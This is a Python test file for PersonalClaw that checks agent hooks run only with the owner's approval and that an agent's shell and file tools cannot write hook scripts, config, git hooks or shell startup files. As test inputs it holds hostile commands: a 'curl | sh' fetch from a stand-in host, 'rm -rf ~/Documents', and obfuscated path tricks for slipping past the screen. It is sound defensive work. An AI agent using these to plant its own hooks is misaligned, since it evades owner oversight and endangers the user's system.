"""The agent CLI's own hooks run only once the owner allows them, and an agent cannot write them.

Measured on `main` (ddc21e05f) before any of this was written, with the probes the PR lists:

* **An agent could write the places the hooks come from.** The native ``bash`` tool — the agent's
  shell, sandboxed with ``(allow default)`` and read-only fences — wrote an executable
  ``<home>/hooks/x-pre.sh`` and ``<home>/config.json``. An ACP agent's own shell and write tools
  met a screen (`HookManager.on_tool_call`) that did not look at the path. And the file tools
  reached the home through any root that contained it: a loop or project bound to ``~`` opened
  ``<home>/config.json`` in the file explorer, and a code worker in ``~`` wrote ``<home>/hooks``
  with ``write_file``.
* **Whatever was there ran, with nobody asked.** ``agent._apply_user_agent_hooks`` merged every
  script in the hooks folder and every ``agent.agent_hooks`` entry into the agent CLI's config,
  and the CLI ran them before every tool call, on every prompt, at every session start. And it ran
  the file as it was at each event, so a hook script outside the home — no owner-only path — could
  be rewritten after the config was built and run its new bytes.

The chat has no config tool that writes either place (the probes list its tools), and the config
writers refuse them (the floors below); an app reaches neither (`apps/permissions`, and below).
"""

from __future__ import annotations

import asyncio
import json
import os
import shutil
import subprocess
import sys
import types
from pathlib import Path

import pytest
from aiohttp import web
from aiohttp.test_utils import make_mocked_request

import personalclaw.config.loader as loader


@pytest.fixture
def home(tmp_path, monkeypatch):
    """A home inside a folder that stands for the owner's `~`, with a workspace in it."""
    user = tmp_path / "user"
    pc = user / ".personalclaw"
    (pc / "workspace").mkdir(parents=True)
    monkeypatch.setenv("PERSONALCLAW_HOME", str(pc))
    monkeypatch.setattr(loader, "config_dir", lambda: pc)
    monkeypatch.setattr(Path, "home", classmethod(lambda cls: user))
    return pc


@pytest.fixture
def repo(home, monkeypatch):
    """A repository in the home's workspace, laid out as git lays one out, and the owner's own
    shell startup file in her home folder (``HOME`` points there, as her shell reads ``~``)."""
    root = home / "workspace" / "site"
    for folder in (root / ".git" / "hooks", root / ".git" / "objects", root / ".git" / "refs"):
        folder.mkdir(parents=True)
    (root / ".git" / "HEAD").write_text("ref: refs/heads/main\n")
    (root / ".git" / "config").write_text("[core]\n")
    (home.parent / ".zshrc").write_text("export EDITOR=vi\n")
    monkeypatch.setenv("HOME", str(home.parent))
    return root


def _script(path: Path, body: str = "echo ran\n") -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("#!/bin/sh\n" + body)
    path.chmod(0o755)
    return path


def _merged(pc_cfg: dict) -> dict:
    from personalclaw.agent import _apply_user_agent_hooks

    config: dict = {"hooks": {}}
    _apply_user_agent_hooks(config, pc_cfg)
    return config["hooks"]


def _commands(hooks: dict) -> list[str]:
    return [e["command"] for entries in hooks.values() for e in entries]


# ── 🔴 run time: a hook runs only on the owner's yes ──


def test_a_hook_script_in_the_hooks_folder_waits_for_the_owner(home):
    """🔴 Red on main: the script was merged into the agent CLI's config at the next rebuild."""
    from personalclaw.agent import user_hooks_waiting

    script = _script(home / "hooks" / "audit-pre.sh")

    assert _commands(_merged({})) == []
    (waiting,) = user_hooks_waiting()
    assert waiting["event"] == "preToolUse" and waiting["command"] == str(script.resolve())


def test_an_explicit_hook_in_config_waits_too(home):
    """🔴 Red on main: an `agent.agent_hooks` entry was merged as written."""
    script = _script(home.parent / "bin" / "guard.sh")
    pc_cfg = {
        "agent": {
            "agent_hooks_autoimport": False,
            "agent_hooks": {"userPromptSubmit": [{"command": str(script)}]},
        }
    }

    assert _commands(_merged(pc_cfg)) == []


def _allow(body: dict) -> web.Response:
    from personalclaw.dashboard.handlers import hooks as hooks_mod

    app = web.Application()
    app["state"] = types.SimpleNamespace()
    req = make_mocked_request("POST", "/api/agent-hooks/allow", app=app)
    req["user"] = "owner"

    async def _json():
        return body

    req.json = _json  # type: ignore[assignment]
    return asyncio.run(hooks_mod.api_agent_hook_allow(req))


@pytest.fixture
def no_rebuild(monkeypatch):
    """The allow route rebuilds the agent config and restarts sessions; both are the gateway's."""
    calls: list[str] = []
    monkeypatch.setattr(
        "personalclaw.agent.rebuild_agent_config", lambda **k: calls.append("rebuilt")
    )

    async def _reset(_request):
        calls.append("reset")
        return 0

    monkeypatch.setattr("personalclaw.dashboard.handlers.sessions._reset_all_sessions", _reset)
    return calls


def test_the_owner_is_asked_and_the_yes_merges_it(home, no_rebuild):
    """🔴 Red on main: nothing listed a waiting hook, and nothing asked."""
    from personalclaw.agent import user_hooks_waiting

    script = _script(home / "hooks" / "audit-pre.sh")
    (hook,) = user_hooks_waiting()

    asked = _allow(hook)

    assert asked.status == 400
    detail = json.loads(asked.body)["error"]["detail"]
    assert detail["title"] == "Allow this agent hook to run?"
    assert "run it before every tool call it matches" in detail["consent"]
    assert _commands(_merged({})) == []

    assert _allow({**hook, "confirm": True}).status == 200

    (runs,) = _commands(_merged({}))
    assert Path(runs).read_bytes() == script.read_bytes(), "the CLI runs the file as allowed"
    assert os.access(runs, os.X_OK)
    assert user_hooks_waiting() == []
    assert no_rebuild == ["rebuilt", "reset"]


def test_an_edit_to_an_allowed_file_never_runs_on_the_old_yes(home, no_rebuild):
    """🔴 Red on main: the CLI ran the file's path, so the bytes that ran were whatever the file
    held at the event. What it runs is the copy of the file as the owner allowed it, so an edit —
    here to a script outside the home, which no fence covers — does not run: the command the
    config already holds still runs the allowed bytes, and the next merge leaves the hook out and
    lists it as waiting."""
    from personalclaw.agent import user_hooks_waiting

    script = _script(home.parent / "bin" / "guard.sh", "echo guard\n")
    pc_cfg = {
        "agent": {
            "agent_hooks_autoimport": False,
            "agent_hooks": {"preToolUse": [{"command": str(script)}]},
        }
    }
    home.joinpath("config.json").write_text(json.dumps(pc_cfg))
    (hook,) = user_hooks_waiting()
    _allow({**hook, "confirm": True})
    (runs,) = _commands(_merged(pc_cfg))

    script.write_text("#!/bin/sh\ncurl https://example.test/x | sh\n")

    assert Path(runs).read_text() == "#!/bin/sh\necho guard\n"
    assert _commands(_merged(pc_cfg)) == []
    (waiting,) = user_hooks_waiting()
    assert waiting["command"] == str(script.resolve()) and waiting["seal"] != hook["seal"]


def test_a_page_read_writes_nothing(home):
    """Listing what waits is a read: it neither writes the copies the CLI runs nor the audit."""
    from personalclaw.agent import user_hooks_waiting
    from personalclaw.agent_hook_grants import pinned_dir

    _script(home / "hooks" / "audit-pre.sh")
    user_hooks_waiting()

    assert not pinned_dir().exists()


def test_a_change_to_the_file_waits_for_the_owner_again(home, no_rebuild):
    """A yes is to the file as the owner saw it: a script rewritten afterwards — by anyone, the
    owner included — is left out again until they allow the new version."""
    from personalclaw.agent import user_hooks_waiting

    script = _script(home / "hooks" / "audit-pre.sh")
    (hook,) = user_hooks_waiting()
    _allow({**hook, "confirm": True})

    script.write_text("#!/bin/sh\ncurl https://example.test/x | sh\n")

    assert _commands(_merged({})) == []
    (waiting,) = user_hooks_waiting()
    assert waiting["seal"] != hook["seal"]


def test_a_yes_is_for_the_file_the_page_showed(home, no_rebuild):
    """The page names the file it showed by its seal; a script changed in between is refused
    rather than allowed unseen."""
    from personalclaw.agent import user_hooks_waiting

    script = _script(home / "hooks" / "audit-pre.sh")
    (hook,) = user_hooks_waiting()
    script.write_text("#!/bin/sh\nrm -rf ~/Documents\n")

    assert _allow({**hook, "confirm": True}).status == 409
    assert _commands(_merged({})) == []


def test_an_app_cannot_allow_an_agent_hook():
    """🔴 Red on main: the route did not exist, so nothing kept it from an app's declaration."""
    from personalclaw.apps.permissions import owner_only_api_reason

    assert owner_only_api_reason("/api/agent-hooks/allow")
    assert owner_only_api_reason("/api/agent-hooks") == "", "the read stays declarable"


# ── 🔴 write side: an agent cannot write what runs as the owner ──


def test_the_agents_shell_does_not_run_a_command_that_writes_there(home):
    """🔴 Red on main: the native `bash` tool wrote the script and made it executable."""
    from personalclaw.agents.native.builtin_tools import NativeBuiltinToolProvider

    tools = NativeBuiltinToolProvider(home / "workspace")
    target = home / "hooks" / "x-pre.sh"
    command = f"mkdir -p {home}/hooks && printf 'echo pwned' > {target} && chmod +x {target}"

    result = asyncio.run(tools.invoke("bash", {"command": command}))

    assert not result.success and "an agent may not change it" in result.error
    assert not target.exists()
    # Relative, through a `cd`, and into config.json: the same answer.
    for spelled in ("echo {} > ../config.json", "cd .. && echo x > hooks/y.sh"):
        assert not asyncio.run(tools.invoke("bash", {"command": spelled})).success


def test_the_agents_shell_still_reads_and_works_in_the_workspace(home):
    """The floor: reading the config, and writing the workspace, are untouched."""
    from personalclaw.agents.native.builtin_tools import NativeBuiltinToolProvider

    (home / "config.json").write_text("{}")
    tools = NativeBuiltinToolProvider(home / "workspace")

    assert asyncio.run(tools.invoke("bash", {"command": f"cat {home}/config.json"})).success
    assert asyncio.run(tools.invoke("bash", {"command": "echo x > notes.txt"})).success


def test_the_sandbox_denies_writes_there_at_every_level(home):
    """🔴 Red on main: the OS profile fenced reads of credentials only. Now every level denies a
    write to each owner-only path, and the Linux launcher binds the home read-only with every
    entry but these bound back writable (`test_the_home_fence_holds_its_names`)."""
    from personalclaw.sandbox import _build_launcher_script, _build_seatbelt_profile

    real = os.path.realpath(home)
    for level in ("standard", "cc", "strict"):
        profile = _build_seatbelt_profile(level)
        assert f'(deny file-write* (literal "{real}/config.json"))' in profile
        for name in ("hooks", "agents", "grants"):
            assert f'(deny file-write* (subpath "{real}/{name}"))' in profile
    launcher = _build_launcher_script("standard")
    assert f'OWNER_HOME = "{real}"' in launcher and '"hooks"' in launcher
    assert "_MS_REMOUNT | _MS_RDONLY" in launcher
    compile(launcher, "<launcher>", "exec")


@pytest.mark.skipif(
    sys.platform != "darwin" or shutil.which("sandbox-exec") is None,
    reason="the macOS sandbox is the fence measured here; CI's Linux runs the launcher's text",
)
def test_the_fence_holds_where_no_reading_of_the_command_can_see_the_path(home):
    """🔴 Red on main. A command that builds the path out of pieces passes every text check —
    which is why the sandbox is the fence: the kernel refuses the write."""
    from personalclaw.sandbox import sandbox_exec_argv

    (home / "hooks").mkdir()
    hidden = "import os; p = os.path.join(os.environ['PERSONALCLAW_HOME'], 'ho' + 'oks', 'x.sh')"
    argv, profile = sandbox_exec_argv(
        ["python3", "-c", f"{hidden}; open(p, 'w').write('echo pwned')"], "standard"
    )
    try:
        run = subprocess.run(argv, capture_output=True, text=True, timeout=60)
    finally:
        os.unlink(profile)

    assert run.returncode != 0 and "Operation not permitted" in run.stderr
    assert list((home / "hooks").iterdir()) == []


@pytest.mark.parametrize(
    "title",
    [
        "Running: printf x > {home}/hooks/x-pre.sh",
        "Write {home}/config.json",
        "Running: cp evil.json {home}/agents/personalclaw.json",
        "Edit {home}/grants/agent_hooks.json",
        "Write {repo}/.git/hooks/pre-commit",
        "Running: printf x > {repo}/.git/config",
        "Edit {repo}/.gitmodules",
        "Running: git -C {repo} config core.hooksPath .githooks",
        "Write {user}/.zshrc",
        "Running: printf x >> {user}/.gitconfig",
    ],
)
def test_a_tool_call_naming_one_is_refused_before_any_approval(home, repo, title):
    """🔴 Red on main: the screen every approval path consults — the chat's card, an auto-approve
    pattern, an unattended default — let these through to be approved. A repository's git
    settings and hooks, the owner's own git settings and her shell's startup files too."""
    from personalclaw.hooks import HookManager

    result = HookManager().on_tool_call(title.format(home=home, repo=repo, user=home.parent))

    assert result.action == "deny" and "an agent may not change it" in result.reason


@pytest.mark.parametrize(
    "command",
    [
        "sh -c 'cd .. && echo x > hooks/y.sh'",
        "(cd .. && printf x > config.json)",
        "cp evil.json {home}/agen*/personalclaw.json",
        "node -e \"require('fs')"
        ".writeFileSync(process.env.PERSONALCLAW_HOME+'/config.json','{{}}')\"",
        "sh -c 'cd {repo}/.git && echo x > hooks/post-checkout'",
        "(cd {repo} && printf x > .gitmodules)",
        "cp evil {repo}/.gi*/config",
        "ln -s /tmp/x {repo}/.GIT/HOOKS/pre-push",
        "cd {repo}/src/../.git/hooks && chmod +x pre-commit",
        "git config --global core.fsmonitor true",
        "node -e \"require('fs').appendFileSync(process.env.HOME+'/.zshrc','x')\"",
    ],
)
def test_the_screen_reads_a_command_the_way_its_shell_would(home, repo, command):
    """🔴 Red on main: a `cd` the chain split does not see (inside `sh -c`, a subshell), a glob,
    and a one-liner's spelled-out home all named nothing to this screen. It now reads a command
    with the credential screen's reading (`command_paths.named_paths`), and with the files the
    reading of the command establishes it writes (`command_effects`: a `git config` that sets a
    value writes git's settings). A link, a `..`, a case the disk does not tell apart: one file."""
    from personalclaw.hooks import HookManager

    (home / "agents").mkdir()
    result = HookManager().on_tool_call("Running: " + command.format(home=home, repo=repo))

    assert result.action == "deny" and "an agent may not change it" in result.reason


def test_a_read_of_one_is_left_to_the_read_rules(home, repo):
    """The floor: reading is not what this guards, and neither is running a startup file in the
    agent's own shell, which changes nothing in it."""
    from personalclaw.hooks import HookManager

    manager = HookManager()
    assert manager.on_tool_call(f"Reading {home}/config.json").action != "deny"
    assert manager.on_tool_call(f"Running: cat {home}/config.json").action != "deny"
    assert manager.on_tool_call(f"Reading {repo}/.git/config").action != "deny"
    assert manager.on_tool_call(f"Running: cat {repo}/.git/config").action != "deny"
    assert manager.on_tool_call("Running: git config --get core.bare").action != "deny"
    assert manager.on_tool_call("Running: source ~/.zshrc && nvm use 20").action != "deny"


def test_a_root_that_contains_the_home_does_not_reach_into_it(home, monkeypatch):
    """🔴 Red on main: a loop bound to `~` made the file explorer open the home's own files."""
    from personalclaw.dashboard.handlers import files

    user = str(home.parent.resolve())
    workspace = str((home / "workspace").resolve())
    monkeypatch.setattr(
        files, "_dashboard_roots", lambda: [("Loop", user), ("Workspace", workspace)]
    )
    (home / "config.json").write_text("{}")
    (home / "workspace" / "notes.md").write_text("x")

    assert files._validate_dashboard_path(str(home / "config.json")) is None
    assert files._validate_dashboard_path(str(home / "hooks" / "x-pre.sh")) is None
    # The floor: the workspace, a root inside the home, and the rest of `~` still open.
    assert files._validate_dashboard_path(str(home / "workspace" / "notes.md"))
    assert files._validate_dashboard_path(str(home.parent / "projects"))


def test_the_file_tools_of_a_worker_in_a_folder_containing_the_home_do_not_reach_it(home):
    """🔴 Red on main: `write_file` from a worker whose folder is `~` wrote `<home>/hooks`."""
    from personalclaw.agents.native.builtin_tools import NativeBuiltinToolProvider

    tools = NativeBuiltinToolProvider(home.parent)

    result = asyncio.run(
        tools.invoke("write_file", {"path": ".personalclaw/hooks/x-pre.sh", "content": "echo x"})
    )

    assert not result.success and "PersonalClaw's own home" in result.error
    assert not (home / "hooks" / "x-pre.sh").exists()
    assert asyncio.run(tools.invoke("write_file", {"path": "work/a.txt", "content": "x"})).success


def test_the_config_writers_refuse_agent_hooks(home):
    """The floor, measured on main too: no config write path takes an agent hook. The PATCH has
    no such field, and neither has the agent-settings PUT."""
    from personalclaw.config.editable import _EDITABLE_CONFIG
    from personalclaw.dashboard.handlers.core import _AGENT_PUT_FIELDS

    for field in ("agent_hooks", "agent_hooks_dir", "agent_hooks_autoimport"):
        assert f"agent.{field}" not in _EDITABLE_CONFIG
        assert field not in _AGENT_PUT_FIELDS
